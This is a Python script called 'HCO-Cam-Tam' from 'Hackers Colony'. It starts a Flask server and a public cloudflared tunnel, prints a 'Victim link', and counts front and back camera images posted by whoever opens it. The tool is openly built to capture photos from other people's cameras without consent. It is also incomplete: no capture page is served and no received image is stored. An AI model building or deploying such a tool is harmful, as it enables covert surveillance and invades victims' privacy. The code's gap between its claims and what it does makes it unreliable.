#!/usr/bin/env python3
"""
HCO-Cam-Tam - Camera Capture Tool
By Azhar (Hackers Colony)
"""

import os
import sys
import time
import subprocess
import threading
from colorama import Fore, Style
from flask import Flask, request

# ----------------------------- CONFIG -----------------------------
YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
CLOUDFLARE_PORT = 8080
FRONT_IMAGES = 5
BACK_IMAGES = 5
# ------------------------------------------------------------------

app = Flask(__name__)
front_count = 0
back_count = 0

# --------------------------- FUNCTIONS ---------------------------

def print_banner():
    print(Fore.RED + "="*50)
    print("          HCO-Cam-Tam by Azhar")
    print("="*50 + Style.RESET_ALL)

def flashy_countdown(seconds=8):
    colors = [Fore.RED, Fore.GREEN, Fore.CYAN, Fore.YELLOW]
    for i in range(seconds, 0, -1):
        color = colors[i % len(colors)]
        print(color + f"{i}..." + Style.RESET_ALL)
        time.sleep(1)

def unlock_message():
    print(Fore.MAGENTA + "\n🔓 To unlock the tool, we will redirect you to our YouTube channel.")
    print("Click SUBSCRIBE + 🔔, then come back and press Enter 🔓" + Style.RESET_ALL)
    # Open YouTube link
    os.system(f"am start -a android.intent.action.VIEW -d {YOUTUBE_URL}")

def display_tool_info():
    print(Fore.RED + Style.BRIGHT + "\nHCO CAM TAM")
    print("by Azhar" + Style.RESET_ALL)
    print(Fore.GREEN + "A Camera Tool\n" + Style.RESET_ALL)

def start_cloudflare_tunnel():
    print(Fore.CYAN + "[*] Starting Cloudflare Tunnel..." + Style.RESET_ALL)
    # Start cloudflared tunnel in subprocess
    tunnel = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://localhost:{CLOUDFLARE_PORT}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    public_url = None
    # Read output to get the public URL
    while True:
        line = tunnel.stdout.readline()
        if not line:
            break
        print(line.strip())
        if "https://" in line and "trycloudflare.com" in line:
            public_url = line.strip().split(" ")[-1]
            break
    if public_url:
        print(Fore.GREEN + f"[*] Cloudflare tunnel is live!\n[*] Victim link: {public_url}\n" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[!] Could not fetch public URL automatically. Check cloudflared manually." + Style.RESET_ALL)
    return public_url

# ------------------------ FLASK ENDPOINTS ------------------------

@app.route("/capture/front", methods=["POST"])
def capture_front():
    global front_count
    front_count += 1
    print(Fore.GREEN + f"[*] Front images received: {front_count}/{FRONT_IMAGES}" + Style.RESET_ALL)
    if front_count == FRONT_IMAGES:
        print(Fore.GREEN + "[*] All front images received ✅" + Style.RESET_ALL)
    return "OK"

@app.route("/capture/back", methods=["POST"])
def capture_back():
    global back_count
    back_count += 1
    print(Fore.CYAN + f"[*] Back images received: {back_count}/{BACK_IMAGES}" + Style.RESET_ALL)
    if back_count == BACK_IMAGES:
        print(Fore.CYAN + "[*] All back images received ✅" + Style.RESET_ALL)
    return "OK"

# ---------------------------- MAIN -------------------------------

def main():
    os.system("clear")
    print_banner()
    flashy_countdown(8)
    unlock_message()
    input(Fore.YELLOW + "\nPress Enter after subscribing to continue..." + Style.RESET_ALL)
    os.system("clear")
    display_tool_info()
    public_url = start_cloudflare_tunnel()
    print(Fore.MAGENTA + f"[*] Flask server running on port {CLOUDFLARE_PORT}..." + Style.RESET_ALL)
    app.run(host="0.0.0.0", port=CLOUDFLARE_PORT, debug=False)

if __name__ == "__main__":
    main()
